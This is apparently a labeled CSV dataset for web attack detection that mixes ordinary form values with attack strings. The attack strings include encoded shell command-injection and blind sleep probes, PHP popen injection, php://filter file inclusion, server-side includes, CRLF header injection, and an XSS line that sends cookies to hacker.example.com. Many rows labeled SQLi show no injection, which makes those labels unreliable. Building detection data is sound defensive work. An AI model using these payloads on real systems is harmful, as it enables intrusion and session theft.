payload,label,source
"modo=registro&login=eamonn&password=46og7ero&nombre=Ludovico&apellidos=Rambla+Jalencas&email=gondel_jansen@andrestabernero.mo&dni=33581223G&direccion=Calle+Napoles,+86,+&ciudad=Sant+Salvador+de+Guardiola&cp=25520&provincia=Toledo&ntc=3505779017401653&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
3574,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D718A8F3B8D7F94088C0B20DBA0DC5BF,Normal,csic_gsi:cisc_normalTraffic_test.txt
qerimi@graficascamp.bt,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3Becho$IFSMQUPHW$((66%2B11))$(echo$IFSMQUPHW)MQUPHW,CMD,seclists_cmd
43658270S,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20BRBPJX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
385EC769D5AF902F8CD17AB502E32655,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=7094&B1=Confirmar/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20EWGAEA%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526,CMD,seclists_cmd
gogou@convention.ye,Normal,csic_gsi:cisc_normalTraffic_test.txt
C/+Lago+Ba�olas+40+,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22|echo%20SAQMPN$((71%2B20))$(echo%20SAQMPN)SAQMPN|,CMD,seclists_cmd
Serrat,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
55739537A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Yasser,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
414769EB59D671019A01813F495A9CE5,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=2545&B1=Pasar+por+caja/,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
324AE98F6AAF76FC0A9D7B2A115F6C87,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7Cecho$IFSUNCOLW$((89%2B19))$(echo$IFSUNCOLW)UNCOLW,CMD,seclists_cmd
D9SOr9an21a2oR,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Pedrosa+d+15,+7?A",Normal,csic_gsi:cisc_normalTraffic_train.txt
E30B6F98580F85DE886F741A2B44B86B,Normal,csic_gsi:cisc_normalTraffic_train.txt
4FD94A17C83C43B7C02A41FA54440078,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20EHNNQT%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
29491,Normal,csic_gsi:cisc_normalTraffic_train.txt
733261B97DB44B2D9167C2775EE7E412,Normal,csic_gsi:cisc_normalTraffic_train.txt
modoA=insertar&precio=8453&B1=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
41749,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5AF613EDC11984E41475649ADA92E302,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ENIIMV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23,CMD,seclists_cmd
Tivissa,Normal,csic_gsi:cisc_normalTraffic_train.txt
249FF116CF0ECE93A9A8CB161CF427E3,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3Becho$IFSPSOQAR$((79%2B87))$(echo$IFSPSOQAR)PSOQAR\,CMD,seclists_cmd
87351797M,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
28D2AAA727A52C94D48B2BFDCB2B7DE4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Gochez,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
FD8690029F10141012BA21D6642D8CEA,Normal,csic_gsi:cisc_normalTraffic_train.txt
ABE99E90F20C60DE1B7B29FE0597A28E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E5B6E34DDA8F5117800B4D908331605E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
)print(`echo%20HXXRRP`.`echo%20$((98%2B1))`.`echo%20HXXRRP`.`echo%20HXXRRP`)%3B.%22HXXRRP,CMD,seclists_cmd
Cinco+Olivas,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=semoon&password=inmedia187e74e&nombre=Bernabella&apellidos=Casades�s+Mirete&email=shkurat_murad@tiposdedrogas.pa&dni=15366808W&direccion=C/+Patricio+Saenz,+153,+12E&ciudad=Berriozar&cp=42311&provincia=Soria&ntc=3603684423770940&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
24,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C76688454BCDFEE7FA168E012AC8D3D5,Normal,csic_gsi:cisc_normalTraffic_test.txt
h.ipot�nica,Normal,csic_gsi:cisc_normalTraffic_test.txt
6FEC3F4B3DCF4609473249A791E82774,Normal,csic_gsi:cisc_normalTraffic_train.txt
9164927843052936A245E0143DC9EDC4,Normal,csic_gsi:cisc_normalTraffic_train.txt
1437589782727245,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Calle+De+San+Lorenzo+88,+4?E",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Pe�amellera+Alta,Normal,csic_gsi:cisc_normalTraffic_test.txt
C33116C9C6CD286005EE9CE8E1A3C0AC,Normal,csic_gsi:cisc_normalTraffic_test.txt
6F2E367A30D5E90C122C441303736E57,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
morsa,Normal,csic_gsi:cisc_normalTraffic_test.txt
74538DE7E8EA8E257836E34972009424,Normal,csic_gsi:cisc_normalTraffic_train.txt
847114729467610DCD0EA0D7B0D34BBC,Normal,csic_gsi:cisc_normalTraffic_test.txt
0106099240126772,Normal,csic_gsi:cisc_normalTraffic_train.txt
9A09802DC01897E48E31141093F3CB6E,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%206%20-ne%20%24%28echo%20MGKXID%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%257C,CMD,seclists_cmd
2EECB71C7E64E0B2BE957196856D9CFB,Normal,csic_gsi:cisc_normalTraffic_train.txt
9fi247A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
22C3C858FF6CEB2E47D1F50DA9AA0498,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B4B4B2F7D762AE7BFB67846400F7D40B,Normal,csic_gsi:cisc_normalTraffic_test.txt
64CB565AC4F5E3F464191BD0FF36F3C2,Normal,csic_gsi:cisc_normalTraffic_test.txt
${popen(print(`echo%20UWOAFS%0aecho%20$((11%2B42))%0aecho%20UWOAFS%0aecho%20UWOAFS`)%3B%252523UWOAFS,CMD,seclists_cmd
85624451M,Normal,csic_gsi:cisc_normalTraffic_train.txt
6908,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"""||echo%20VKPFAP$((92%2B94))$(echo%20VKPFAP)VKPFAP""",CMD,seclists_cmd
%26%26echo%20YKZSCO$((10%2B70))$(echo%20YKZSCO)YKZSCO%22,CMD,seclists_cmd
317D151F5DD0E9C820E6C6F34AE01AD9,Normal,csic_gsi:cisc_normalTraffic_test.txt
296B91DAD7801452F4FA4CAE43F065DF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%3B%20str%3D%24%28echo%20ZEPYMS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20,CMD,seclists_cmd
2354,Normal,csic_gsi:cisc_normalTraffic_train.txt
||echo$IFSXEGABJ$((43%2B91))$(echo$IFSXEGABJ)XEGABJ\,CMD,seclists_cmd
99E888504A33D5C60D405A47DD891A66,Normal,csic_gsi:cisc_normalTraffic_test.txt
38682401N,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7B06D0AF1AD69DB6B63940FEECE4F890,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%208%20-ne%20%24%28echo%20KXLYID%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
662EEB6965DB842F57A8AA9B22DD49DF,Normal,csic_gsi:cisc_normalTraffic_train.txt
capes,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
EC28D06F2C665D3A5DED30563767E9C4,Normal,csic_gsi:cisc_normalTraffic_train.txt
1804FA9BA0D33AFDB8989AF9C6CDB4A7,Normal,csic_gsi:cisc_normalTraffic_train.txt
2867BA0DA66C8BBB74496329BCE09AE9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6279584819907955,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
SaL7orij4,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=paxton&password=e4TE9ADa&nombre=Hermelinda&apellidos=Llorente+Batllori&email=kawazu3@alquilerpantallasled.org&dni=79540644C&direccion=Cami�o+Dentagron+68,+&ciudad=San+Mart�n+del+R�o&cpA=33909&provincia=Teruel&ntc=3393638948319901&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3318A25AF34041595C54E6B4DEDA9B12,Normal,csic_gsi:cisc_normalTraffic_test.txt
5B625E77F4E38A88C57FF313B3A335E8,Normal,csic_gsi:cisc_normalTraffic_test.txt
9FA4354BEF3734F9A438ACD181513035,Normal,csic_gsi:cisc_normalTraffic_test.txt
6F1BCCEAFF3B662455F9E78D6C94F514,Normal,csic_gsi:cisc_normalTraffic_train.txt
Sellares+Brihuega,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
labrera,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Vega+del+Codorno,Normal,csic_gsi:cisc_normalTraffic_train.txt
6851,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7335,Normal,csic_gsi:cisc_normalTraffic_test.txt
entrarany%3F%0D%0ASet-cookie%3A+Tamper%3D1041264011025374727,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
habilitador,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=1477&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
1C271297C34327E1930FC3DC6A1F9A83,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=meleskie&password=598le65&nombre=Ubr�aco&apellidos=Abell�+Segarras&email=myrna5@adondeir.at&dni=33744160D&direccion=Ruiz+De+Alda,+78+&ciudad=Villatobas&cp=23657&provincia=Segovia&ntc=4073783110590723&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
%20echo%20QCALON$((95%2B41))$(echo%20QCALON)QCALON%7C,CMD,seclists_cmd
San+Jos�+del+Valle,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Periodista+Juanito+Cortes,+95+%7C",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
50133,Normal,csic_gsi:cisc_normalTraffic_train.txt
4A284115EDBE981503398E6018C5432F,Normal,csic_gsi:cisc_normalTraffic_train.txt
B11B6871F6EB2D92F42A52E4B0F5B662,Normal,csic_gsi:cisc_normalTraffic_train.txt
5130E5F71C2A0EBF3CE4477883354058,Normal,csic_gsi:cisc_normalTraffic_test.txt
Ludolfo,Normal,csic_gsi:cisc_normalTraffic_train.txt
e11c5nt6o,Normal,csic_gsi:cisc_normalTraffic_train.txt
5925047DE57F6ED5B3D53D5DAC181266,Normal,csic_gsi:cisc_normalTraffic_train.txt
A297D2F42F0CF403B7E534FF6345B73B,Normal,csic_gsi:cisc_normalTraffic_test.txt
883B517E8BE45BBD2760AC6AE457351C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%7C%20%5B%209%20-ne%20%24%28echo%20JRAZZA%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%26,CMD,seclists_cmd
697EC0003BF1F22E134ACDD0350862B0,Normal,csic_gsi:cisc_normalTraffic_train.txt
3222655347075896,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
kirbee,Normal,csic_gsi:cisc_normalTraffic_train.txt
DE23629A7493241E8A29370250803909,Normal,csic_gsi:cisc_normalTraffic_test.txt
4566CD42612CAB3F929AAB422FC5A091,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5C7E53F1E147FBF417C629371A6F6F3F,Normal,csic_gsi:cisc_normalTraffic_train.txt
145FABABA904E21BFA6EBF17769E4E83,Normal,csic_gsi:cisc_normalTraffic_train.txt
86164975Y,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D4C73D1D93D0DD343D22943AFE096E1B,Normal,csic_gsi:cisc_normalTraffic_test.txt
192D4AE2B070BAD52E3EAB25FFD0FBDE,Normal,csic_gsi:cisc_normalTraffic_test.txt
5C8330F19D8A112F093141657843808F,Normal,csic_gsi:cisc_normalTraffic_test.txt
8E7CCBB7F4654F5B1DBAAAE85BBF3A59,Normal,csic_gsi:cisc_normalTraffic_test.txt
lucie8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3ulga5izado4a,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Ballena,+91,+10?A",Normal,csic_gsi:cisc_normalTraffic_train.txt
lazure,Normal,csic_gsi:cisc_normalTraffic_train.txt
569A66288CB1496C5BC19391B99E8EA0,Normal,csic_gsi:cisc_normalTraffic_test.txt
%27%0A%20str%3D%24%28echo%20JTHMZI%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
Busquet+Ojelja,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22||echo%20DORIYY$((30%2B85))$(echo%20DORIYY)DORIYY%22,CMD,seclists_cmd
%0aecho%20VXXNDX$((4%2B53))$(echo%20VXXNDX)VXXNDX%7C,CMD,seclists_cmd
id=2&nombre=Queso+Manchego&precio=85&cantidad=50&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
E5D711D11808914616B249805E893AFF,Normal,csic_gsi:cisc_normalTraffic_train.txt
0324680856552215,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
toly,Normal,csic_gsi:cisc_normalTraffic_test.txt
Fuente+�lamo+de+Murcia,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Carrer+Auro+S/N,+1?H",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
guilmett,Normal,csic_gsi:cisc_normalTraffic_train.txt
Adelmo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D8751B3A4C7EA7FAC5FDCD5CACC327A7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%0A%20str%3D%24%28echo%20GIPRGX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26,CMD,seclists_cmd
48E2D39133C8003159D69DD0AC3C5CCF,Normal,csic_gsi:cisc_normalTraffic_train.txt
91C8E2DB9E7B312FF5B6E6A263B073DA,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=sessionid=12312312&+username=<script>document.location='http://hacker+.example.com/cgi-bin/cookiesteal.cgi?'++document.cookie</script>,XSS,csic_gsi:cisc_anomalousTraffic_test.txt
;echo%20CSPAAF$((48%2B26))$(echo%20CSPAAF)CSPAAF,CMD,seclists_cmd
85A8915ED157EB5BA53B2FA89A546A0B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Cervatos+de+la+Cueza,Normal,csic_gsi:cisc_normalTraffic_train.txt
php://filter/read=convert.base64-encode/resource=index.php,FileInclusion,seed:labeled_samples
Torrecilla+del+Monte,Normal,csic_gsi:cisc_normalTraffic_train.txt
'||echo$IFSACFFZC$((29%2B51))$(echo$IFSACFFZC)ACFFZC|,CMD,seclists_cmd
EE94E2ADB7857A18DD8D9F6089356404,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20CLRJXD%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%203%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C,CMD,seclists_cmd
leaphear,Normal,csic_gsi:cisc_normalTraffic_test.txt
"""|echo%20DDRLVR$((41%2B36))$(echo%20DDRLVR)DDRLVR%5C%5C",CMD,seclists_cmd
60FFE2D533B0EA1FC8653E6393F63ECB,Normal,csic_gsi:cisc_normalTraffic_test.txt
1059928902417697,Normal,csic_gsi:cisc_normalTraffic_train.txt
Duset,Normal,csic_gsi:cisc_normalTraffic_test.txt
86FF415B3C2302090CE761049EB118E9,Normal,csic_gsi:cisc_normalTraffic_test.txt
"%7Cecho%20VHYHSQ$((46%2B81))$(echo%20VHYHSQ)VHYHSQ""",CMD,seclists_cmd
robbie,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
constantaras@fighting-machines.uk,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3293D554AB924812B8782BAA57CCCDA6,Normal,csic_gsi:cisc_normalTraffic_train.txt
24314757P,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%26%26echo%20RPLSNW$((41%2B19))$(echo%20RPLSNW)RPLSNW%26,CMD,seclists_cmd
4EA94E873F7BFD1C8A0CB64594CD88BE,Normal,csic_gsi:cisc_normalTraffic_test.txt
5175598912871065,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=2&nombreA=Queso+Manchego&precio=100&cantidad=60&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20OFDULD%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2527,CMD,seclists_cmd
modo=entrar&login=allahdin&pwd=20pi6a1I6N&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
0AF1C9062AD3EBC10EC0C5602237A5AF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
85DC6ECBC8D86E24E96089D21E8FCA71,Normal,csic_gsi:cisc_normalTraffic_train.txt
"id=2<!--#include+file=""archivo_secreto""+-->",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C/+Cuenca+S/N+,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=fedora&password=term�metro&nombre=Wilson&apellidos=Valdano&email=borsodi-heintje@unidadesdeventilacion.tg&dni=72799603A&direccion=C/+Milano+170,+9-D&ciudad=Castellanos+de+Castro&cp=25182&provincia=Alicante&ntc=9457153149790079&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
olsson.kupfer@arroyo-molinos.mz,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Plza.+Nuevo+Mundo,+119,+4-D",Normal,csic_gsi:cisc_normalTraffic_train.txt
modoA=insertar&precio=794&B1=Pasar+por+caja,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
echo$IFSRVGTQR$((51%2B29))$(echo$IFSRVGTQR)RVGTQR|,CMD,seclists_cmd
05458,Normal,csic_gsi:cisc_normalTraffic_train.txt
0292117B50E3571F7BA120E272AD6F8E,Normal,csic_gsi:cisc_normalTraffic_train.txt
0625933D302A3E3FB2EA55F27AE7E25E,Normal,csic_gsi:cisc_normalTraffic_test.txt
7C6D6C541E3DC37D62BA37B5FC5D6B51,Normal,csic_gsi:cisc_normalTraffic_train.txt
E926AD1271E04E5F18D8DEFD93038D9B,Normal,csic_gsi:cisc_normalTraffic_test.txt
3192907631401763,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&nombre=Jam�n+Ib�rico&precio=85&cantidad=2&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
Pompa,Normal,csic_gsi:cisc_normalTraffic_train.txt
kit,Normal,csic_gsi:cisc_normalTraffic_train.txt
";echo$IFSQKZBJP$((23%2B59))$(echo$IFSQKZBJP)QKZBJP""",CMD,seclists_cmd
10374,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=grethel&password=lech6gad9&nombre=Pamela&apellidos=Casajuan+Fraguas&email=lupton_magnin@acchportugal.nf&dni=28395383C&direccion=Calle+Rio+Bullones,+165+&ciudad=Ahigal+de+los+Aceiteros&cp=45720&provincia=Barcelona&ntc=7798599554613222&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
79067B59E316C0330D562F6F268B1C45,Normal,csic_gsi:cisc_normalTraffic_train.txt
59C75C97C8988CC60C3FFEDA9EC0B2D1,Normal,csic_gsi:cisc_normalTraffic_train.txt
poluchow,Normal,csic_gsi:cisc_normalTraffic_test.txt
1922,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%3B%20str%3D%24%28echo%20XAUGRF%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%26,CMD,seclists_cmd
%0aecho$IFSZFETQZ$((73%2B0))$(echo$IFSZFETQZ)ZFETQZ%5C%5C,CMD,seclists_cmd
${proc_open(print(`echo%20MLSOYZ;echo%20$((72%2B12));echo%20MLSOYZ;echo%20MLSOYZ`)%3B.%2522MLSOYZ,CMD,seclists_cmd
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20NWAYIZ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%5C%5C,CMD,seclists_cmd
580197218E25C80E7B8ABABDA1529A61,Normal,csic_gsi:cisc_normalTraffic_test.txt
AAE84B472585A4403651F83C7E327D02,Normal,csic_gsi:cisc_normalTraffic_train.txt
8292AB887CC5B84D8064D2AFA568D0D7,Normal,csic_gsi:cisc_normalTraffic_test.txt
C50EDBB582DEBAC39A7EDEDADDEEC882,Normal,csic_gsi:cisc_normalTraffic_train.txt
depredador,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%20echo%20VJRMHC$((3%2B22))$(echo%20VJRMHC)VJRMHC%22,CMD,seclists_cmd
957793E31551AC616F2C53818A2AFA22,Normal,csic_gsi:cisc_normalTraffic_train.txt
0AB81918A226A366CA6167BC4E74CF33,Normal,csic_gsi:cisc_normalTraffic_test.txt
BF8053F4328521417116909CCBFB0241,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20ZDSKKE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
roccardi.betten@carrillo-de-albornoz.mil,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20IXZJDX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20VGAFPT%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%205%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%22,CMD,seclists_cmd
D498003A752BADFFE6ABA10B0D2BB3CB,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B21E411FFBA78D27FEA924B867633FDA,Normal,csic_gsi:cisc_normalTraffic_train.txt
4325308116770728,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20KJBKAZ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20,CMD,seclists_cmd
42830C0A2152099B062248458E2B9228,Normal,csic_gsi:cisc_normalTraffic_train.txt
480118822B3EEC9F2EC57BD319A037A9,Normal,csic_gsi:cisc_normalTraffic_test.txt
hua-yuan,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
667EBCC4B14EE853FDD709F9FF297D4E,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=registro&login=schafer&password=7lI7e37r06&nombre=Santos&apellidos=Ricciardiello+Ameller&email=kelz@animationproject.be&dni=08841812Z&direccion=Passeig+Oreneta+23+8?Gbob@<SCRipt>alert(Paros)</scrIPT>.parosproxy.org&ciudad=Huarte/Uharte&cp=37488&provincia=C�ceres&ntc=7240523818698482&B1=Registrar,XSS,csic_gsi:cisc_anomalousTraffic_test.txt
50FE27CA62FEFF69793650CCD0FDFC2C,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=gahan&password=eMbARGaD!O&nombre=Ermelindo&apellidos=Mari�o+Caraball&email=atherton@madrid2012.ht&dni=35936056M&direccion=Carretera+Nacional+139,+9?A&ciudad=Cijuela&cp=10131&provincia=Lleida&ntc=7505555834849363&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
carey@x2.com.th,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E442C42A62B0FDF5BE9CA8C261AD20AF,Normal,csic_gsi:cisc_normalTraffic_train.txt
DA92512B658DABE9D9F1BBA1002DC1D1,Normal,csic_gsi:cisc_normalTraffic_test.txt
84F23FFB136945A6A20F9FE6602BCB03,Normal,csic_gsi:cisc_normalTraffic_test.txt
DE6BC956C8FBD31A53C2565280A6645B,Normal,csic_gsi:cisc_normalTraffic_test.txt
;echo$IFSQTUCLW$((99%2B59))$(echo$IFSQTUCLW)QTUCLW%27,CMD,seclists_cmd
A8FC33B4B9CA495EB18183545E77E91C,Normal,csic_gsi:cisc_normalTraffic_train.txt
0214A559CD96D8FAFE03438ADE2F6D76,Normal,csic_gsi:cisc_normalTraffic_train.txt
2B4120BA1380DBBD4C7D9C94D30FD57A,Normal,csic_gsi:cisc_normalTraffic_train.txt
bredfeld0,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
B9CF8704940235414E1B5EE0FAECBEF4,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=chaz&password=5o205in2s5&nombre=Le�n&apellidos=Cerezo+Amatller&email=kilderhoff@soyrojo.ch&dni=13371492M&direccion=Camino+De+Los+Crisantemos+89,+9D&ciudad=Robregordo&cp=21590&provincia=Girona&ntc=3338979613455690&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
A735B74EDC6EDE8B8D64B561B57940AD,Normal,csic_gsi:cisc_normalTraffic_test.txt
5662773698137803,Normal,csic_gsi:cisc_normalTraffic_test.txt
06918701W,Normal,csic_gsi:cisc_normalTraffic_train.txt
';echo$IFSTDCNYP$((73%2B27))$(echo$IFSTDCNYP)TDCNYP|,CMD,seclists_cmd
"Registrar<!--#include+file=""archivo_secreto""+-->",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
